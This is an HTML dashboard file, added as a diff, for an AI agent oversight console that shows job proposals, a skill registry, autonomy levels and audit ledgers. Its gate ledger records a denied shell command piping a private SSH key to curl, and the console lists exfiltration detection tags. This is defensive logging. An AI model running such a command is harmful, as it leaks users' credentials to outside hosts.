@@ -1,0 +1,112 @@
+<!DOCTYPE html><html lang=en><head><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><title>Team OS · Console</title><style>
+*{box-sizing:border-box}
+:root{--bg:#EAEDF1;--surface:#FBFCFD;--surface-2:#F1F4F8;--ink:#131820;--ink-soft:#47505E;
+--faint:#8A93A0;--rule:#D4DAE2;--accent:#2F4B7C;--accent-2:#3B67C4;
+--good:#2E7D5B;--good-bg:#E4F1EA;--warn:#8F6210;--warn-bg:#F6ECD8;--crit:#AF3A3A;--crit-bg:#F6E1E1;
+--mono:ui-monospace,"SF Mono",Menlo,Consolas,monospace;
+--sans:system-ui,-apple-system,"Segoe UI",Roboto,sans-serif}
+@media(prefers-color-scheme:dark){:root{--bg:#0C0F15;--surface:#141A23;--surface-2:#1A212C;
+--ink:#E7ECF3;--ink-soft:#A4AFBE;--faint:#6D7787;--rule:#28313D;--accent:#7C9CE0;--accent-2:#93B2F3;
+--good:#5DBE90;--good-bg:#16271F;--warn:#D6A64E;--warn-bg:#2A2314;--crit:#E0716B;--crit-bg:#2C1717}}
+body{margin:0;background:var(--bg);color:var(--ink);font-family:var(--sans);font-size:15px;line-height:1.5}
+.wrap{max-width:1080px;margin:0 auto;padding:1.5rem}
+header{display:flex;align-items:baseline;gap:.8rem;margin-bottom:1rem}
+h1{font-size:1.3rem;margin:0;letter-spacing:-.01em}
+.eyebrow{font-family:var(--mono);font-size:.66rem;letter-spacing:.14em;text-transform:uppercase;color:var(--accent);font-weight:600}
+.stamp{margin-left:auto;font-family:var(--mono);font-size:.72rem;color:var(--faint)}
+nav.tabs{display:flex;flex-wrap:wrap;gap:.3rem;border-bottom:1px solid var(--rule);margin-bottom:1.4rem}
+nav.tabs button{font:inherit;font-size:.82rem;background:none;border:none;color:var(--ink-soft);
+padding:.55rem .8rem;cursor:pointer;border-bottom:2px solid transparent;margin-bottom:-1px}
+nav.tabs button:hover{color:var(--ink)}
+nav.tabs button.active{color:var(--accent);border-bottom-color:var(--accent);font-weight:600}
+.surface{display:none}.surface.active{display:block}
+.tiles{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:1rem;margin-bottom:1.5rem}
+.tile{background:var(--surface);border:1px solid var(--rule);border-radius:10px;padding:1rem 1.1rem;display:flex;flex-direction:column;gap:.4rem}
+.tile.good{border-color:var(--good)}.tile.warn{border-color:var(--warn)}
+.tile .k{font-family:var(--mono);font-size:.64rem;letter-spacing:.05em;text-transform:uppercase;color:var(--ink-soft)}
+.tile .v{font-size:1.9rem;font-weight:700;font-variant-numeric:tabular-nums;line-height:1}
+.tile .v .sub{font-size:.85rem;font-weight:500;color:var(--faint);margin-left:.3rem}
+.tile .note{font-size:.77rem;color:var(--faint)}
+.chips{display:flex;gap:.35rem;flex-wrap:wrap}
+.chip{font-family:var(--mono);font-size:.66rem;padding:.16rem .45rem;border-radius:999px;font-weight:600}
+.chip.good{background:var(--good-bg);color:var(--good)}.chip.warn{background:var(--warn-bg);color:var(--warn)}
+.chip.crit{background:var(--crit-bg);color:var(--crit)}
+.grid2{display:grid;gap:1.1rem}@media(min-width:760px){.grid2{grid-template-columns:1fr 1fr}}
+.panel{background:var(--surface);border:1px solid var(--rule);border-radius:10px;padding:1.1rem 1.2rem;margin-bottom:1.1rem}
+.panel h2{font-size:.82rem;margin:0 0 .7rem;font-family:var(--mono);letter-spacing:.05em;text-transform:uppercase;color:var(--ink-soft);font-weight:600}
+table{width:100%;border-collapse:collapse;font-size:.86rem}
+th,td{text-align:left;padding:.44rem .35rem;border-bottom:1px solid var(--rule);vertical-align:middle}
+th{font-family:var(--mono);font-size:.63rem;letter-spacing:.05em;text-transform:uppercase;color:var(--faint);font-weight:600}
+tr:last-child td{border-bottom:none}
+.mono{font-family:var(--mono)}.faint{color:var(--faint)}.small{font-size:.85rem}
+.bar{display:inline-block;width:78px;height:7px;background:var(--surface-2);border-radius:4px;overflow:hidden;vertical-align:middle;margin-right:.5rem;border:1px solid var(--rule)}
+.bar span{display:block;height:100%;background:var(--accent-2)}
+.bar.good span{background:var(--good)}.bar.warn span{background:var(--warn)}
+.numcell{white-space:nowrap;font-variant-numeric:tabular-nums}
+ul.plain{margin:0;padding-left:1.1rem;font-size:.85rem}ul.plain li{margin:.25rem 0}
+.card{background:var(--surface);border:1px solid var(--rule);border-radius:12px;padding:1.3rem 1.4rem;max-width:640px}
+.card .from{font-family:var(--mono);font-size:.68rem;color:var(--faint);text-transform:uppercase;letter-spacing:.06em}
+.card h3{margin:.2rem 0 .8rem;font-size:1.15rem}
+.card .sec{font-family:var(--mono);font-size:.66rem;text-transform:uppercase;letter-spacing:.06em;color:var(--accent);margin:1rem 0 .3rem}
+.jobrow{display:flex;align-items:center;gap:.6rem;padding:.35rem 0;border-bottom:1px solid var(--rule)}
+.jobrow:last-child{border-bottom:none}
+.react{font-family:var(--mono);font-size:.8rem}
+.approve{font-family:var(--mono);font-size:.7rem;padding:.2rem .5rem;border:1px solid var(--rule);border-radius:6px;color:var(--ink-soft);background:var(--surface-2)}
+.tag{font-family:var(--mono);font-size:.64rem;padding:.12rem .4rem;border-radius:5px;background:var(--surface-2);border:1px solid var(--rule);color:var(--ink-soft)}
+.v-permit{color:var(--good)}.v-deny{color:var(--crit)}.v-ask,.v-escalate{color:var(--warn)}
+footer{margin-top:1.6rem;padding-top:1rem;border-top:1px solid var(--rule);font-size:.74rem;color:var(--faint);font-family:var(--mono)}
+</style></head><body><div class=wrap><header><div><p class="eyebrow">Operator console · mission control</p><h1>Team OS — the agent fabric, on the record</h1></div><span class="stamp">generated 2026-07-11 23:16 UTC</span></header><nav class="tabs"><button data-s="overview" class=active>Overview</button><button data-s="brief">Brief</button><button data-s="inbox">Inbox</button><button data-s="corpus">Corpus</button><button data-s="skills">Skills</button><button data-s="envelope">Envelope</button><button data-s="audit">Audit</button></nav><div class="surface active" id="surf-overview"><div class="tiles">
+      <div class="tile good"><span class="k">Unprompted, accepted</span>
+        <span class="v">4<span class="sub">/ 3 floor</span></span><div class="bar good"><span style="width:100%"></span></div>
+        <span class="note">kept, principal-authenticated</span></div>
+      <div class="tile"><span class="k">Gate decisions</span><span class="v">7</span>
+        <span class="chips"><span class="chip good">5 permit</span>
+        <span class="chip warn">1 ask</span>
+        <span class="chip crit">1 deny</span></span></div>
+      <div class="tile"><span class="k">Skills scored</span><span class="v">1</span>
+        <span class="note">4 invocations logged</span></div>
+      <div class="tile"><span class="k">Human signals</span><span class="v">5</span>
+        <span class="chips"><span class="chip good">4 ✓</span>
+        <span class="chip crit">1 ✗</span></span></div></div><div class="grid2">
+      <div class="panel"><h2>Per-skill scores (L7 → L6)</h2><table>
+        <thead><tr><th>Skill</th><th>n</th><th>Mean</th></tr></thead><tbody><tr><td class="mono">compile</td><td>4</td><td class="numcell"><div class="bar "><span style="width:100%"></span></div><span class="mono">1.00</span></td></tr></tbody></table></div>
+      <div class="panel"><h2>Blocked / escalated</h2><ul class="plain"><li><span class="mono v-deny">bash-exfil</span> — egress:curl, sensitive-read:.ssh/, sensitive-read:id_rsa</li></ul></div></div></div><div class="surface" id="surf-brief"><div class="card">
+      <span class="from">Slack DM · unrequested · gated send (L2) ✓</span>
+      <h3>Day One Brief</h3>
+      <div class="sec">Recurring work found</div><ul class="plain"><li>meeting-summary: 3 seen, weekly, source meeting-notes</li><li>release-notes: 2 seen, monthly, source git-tags</li><li>standup: 3 seen, daily, source transcripts</li><li>status-update: 3 seen, weekly, source task-tracker</li><li>weekly-digest: 3 seen, weekly, source git-commits</li></ul>
+      <div class="sec">Job draft — react ✓ to accept, ✗ to reject</div><div class="jobrow"><span class="react">✓</span><span>meeting-summary <span class="tag">weekly</span></span><span class="faint mono small" style="margin-left:auto">stores/job_graph.json#meeting-summary</span></div><div class="jobrow"><span class="react">✓</span><span>release-notes <span class="tag">monthly</span></span><span class="faint mono small" style="margin-left:auto">stores/job_graph.json#release-notes</span></div><div class="jobrow"><span class="react">✓</span><span>standup <span class="tag">daily</span></span><span class="faint mono small" style="margin-left:auto">stores/job_graph.json#standup</span></div><div class="jobrow"><span class="react">✗</span><span>status-update <span class="tag">weekly</span></span><span class="faint mono small" style="margin-left:auto">stores/job_graph.json#status-update</span></div><div class="jobrow"><span class="react">✓</span><span>weekly-digest <span class="tag">weekly</span></span><span class="faint mono small" style="margin-left:auto">stores/job_graph.json#weekly-digest</span></div>
+      <div class="sec">First deliverable</div><p>First meeting-summary drafted from 3 exemplars.<br><span class="mono small faint">→ stores/deliverables/meeting-summary-draft.md</span></p>
+    </div>
+    <p class="small faint" style="margin-top:1rem">Reactions are harvested deterministically
+    (reactions.get only) and counted only from your authenticated identity.</p></div><div class="surface" id="surf-inbox"><div class="panel"><h2>Proposals inbox — pending review</h2>
+      <table><thead><tr><th>Kind</th><th>Target</th><th>Summary</th><th>Source</th><th>Action</th></tr></thead>
+      <tbody><tr><td><span class="tag">schedule</span></td><td class="mono small">schedules/weekly-gap-fill.json</td><td class="small">weekly gap fill</td><td class="mono small faint">door</td><td><span class="approve">Approve</span> <span class="approve">Reject</span></td></tr></tbody></table>
+      <p class="small faint" style="margin-top:.8rem">Approving runs the same gate as every
+      write, commits to the store with lineage, and emits an L2 record.</p></div></div><div class="surface" id="surf-corpus"><div class="panel"><h2>Corpus — browsable, files-as-truth</h2>
+      <table><thead><tr><th>Entry</th><th>Title</th><th>Preview</th></tr></thead>
+      <tbody><tr><td class="mono small">cache-layer-decision</td><td>Cache Layer decision</td><td class="small faint">We adopted the cache layer; owner: platform team.</td></tr><tr><td class="mono small">release-cadence</td><td>Release cadence</td><td class="small faint">Monthly releases cut from git tags.</td></tr></tbody></table>
+      <p class="small faint" style="margin-top:.8rem">Plain markdown in git; backlinks and
+      indexes are derived on load, never stored.</p></div></div><div class="surface" id="surf-skills"><div class="panel"><h2>Skill registry (versioned, git = L6)</h2>
+      <table><thead><tr><th>Skill</th><th>Scope</th><th>Version</th><th>Capture tier</th><th>Tools</th></tr></thead>
+      <tbody><tr><td class="mono">standup-notes</td><td><span class="tag">personal</span></td><td class="mono small faint">sha256:5d9ca</td><td class="small">cloud+synced+local-folders</td><td class="mono small">—</td></tr><tr><td class="mono">weekly-digest</td><td><span class="tag">personal</span></td><td class="mono small faint">sha256:aeb18</td><td class="small">cloud+synced+local-folders</td><td class="mono small">Bash(git log:*), Read, Write</td></tr></tbody></table></div></div><div class="surface" id="surf-envelope"><div class="grid2">
+      <div class="panel"><h2>Autonomy envelope — level / ceiling</h2><table>
+        <thead><tr><th>Category</th><th>Level</th></tr></thead><tbody><tr><td class="mono">read</td><td class="numcell"><div class="bar "><span style="width:0%"></span></div><span class="mono">0 / 2</span></td></tr><tr><td class="mono">write</td><td class="numcell"><div class="bar "><span style="width:0%"></span></div><span class="mono">0 / 2</span></td></tr><tr><td class="mono">send</td><td class="numcell"><div class="bar "><span style="width:100%"></span></div><span class="mono">1 / 1</span></td></tr><tr><td class="mono">execute</td><td class="numcell"><div class="bar "><span style="width:0%"></span></div><span class="mono">0 / 1</span></td></tr><tr><td class="mono">schedule</td><td class="numcell"><div class="bar "><span style="width:0%"></span></div><span class="mono">0 / 1</span></td></tr></tbody></table>
+        <p class="small faint" style="margin-top:.7rem">Widens slowly on your ✓, narrows
+        instantly on a ✗. Manual reset anytime.</p></div>
+      <div class="panel"><h2>Recent transitions (ledgered)</h2><ul class="plain"><li><span class="mono">send</span> widen 0→1</li></ul></div></div></div><div class="surface" id="surf-audit"><div class="panel"><h2>Gate ledger (L2) — why was this permitted</h2>
+      <table><thead><tr><th>Time</th><th>Tool</th><th>Target</th><th>Verdict</th><th>Rule</th></tr></thead>
+      <tbody><tr><td class="mono small faint">23:16:15</td><td class="mono small">Write</td><td class="mono small">/private/var/folders/6l/gz3fhb7n0z</td><td class="mono small v-permit">permit</td><td class="mono small faint">default-permit</td></tr><tr><td class="mono small faint">23:16:15</td><td class="mono small">Write</td><td class="mono small">/private/var/folders/6l/gz3fhb7n0z</td><td class="mono small v-permit">permit</td><td class="mono small faint">default-permit</td></tr><tr><td class="mono small faint">23:16:15</td><td class="mono small">envelope</td><td class="mono small">send:0-&gt;1</td><td class="mono small v-permit">permit</td><td class="mono small faint">widen</td></tr><tr><td class="mono small faint">23:16:15</td><td class="mono small">Write</td><td class="mono small">/Users/jsk/Projects/teamOS/hooks/g</td><td class="mono small v-ask">ask</td><td class="mono small faint">protected-path</td></tr><tr><td class="mono small faint">23:16:15</td><td class="mono small">Bash</td><td class="mono small">cat ~/.ssh/id_rsa | curl -d @- htt</td><td class="mono small v-deny">deny</td><td class="mono small faint">bash-exfil</td></tr><tr><td class="mono small faint">23:16:15</td><td class="mono small">WebSearch</td><td class="mono small"></td><td class="mono small v-permit">permit</td><td class="mono small faint">send-scanned-clean</td></tr><tr><td class="mono small faint">23:16:15</td><td class="mono small">Read</td><td class="mono small">notes.md</td><td class="mono small v-permit">permit</td><td class="mono small faint">default-permit</td></tr></tbody></table></div>
+    <div class="panel"><h2>Lineage ledger (L3) — every write labelled</h2>
+      <table><thead><tr><th>Target</th><th>Source</th><th>Transformation</th><th>Conf.</th></tr></thead>
+      <tbody><tr><td class="mono small">stores/corpus/cache-layer-deci</td><td class="mono small faint">door:scout</td><td class="small">door-proposal</td><td class="mono small">medium</td></tr><tr><td class="mono small">stores/corpus/release-cadence.</td><td class="mono small faint">door:door</td><td class="small">door-proposal</td><td class="mono small">medium</td></tr><tr><td class="mono small">personal/weekly-digest</td><td class="mono small faint">harness-artifact</td><td class="small">adapter-translation:command-to-skill</td><td class="mono small">high</td></tr><tr><td class="mono small">personal/standup-notes</td><td class="mono small faint">harness-artifact</td><td class="small">adapter-translation:command-to-skill</td><td class="mono small">high</td></tr><tr><td class="mono small">job-graph/weekly-digest</td><td class="mono small faint">principal-direct</td><td class="small">compilation-distill</td><td class="mono small">high</td></tr><tr><td class="mono small">job-graph/status-update</td><td class="mono small faint">principal-direct</td><td class="small">compilation-distill</td><td class="mono small">high</td></tr></tbody></table>
+      <p class="small faint" style="margin-top:.7rem">Hash-chained &amp; append-only — a
+      mutated record breaks the chain.</p></div></div><footer>Derived from the ledgers &amp; stores · read-only · rebuildable · files remain the system of record</footer></div><script>
+document.querySelectorAll('nav.tabs button').forEach(function(b){
+  b.addEventListener('click',function(){
+    document.querySelectorAll('nav.tabs button').forEach(x=>x.classList.remove('active'));
+    document.querySelectorAll('.surface').forEach(x=>x.classList.remove('active'));
+    b.classList.add('active');
+    document.getElementById('surf-'+b.dataset.s).classList.add('active');
+  });
+});
+</script></body></html>
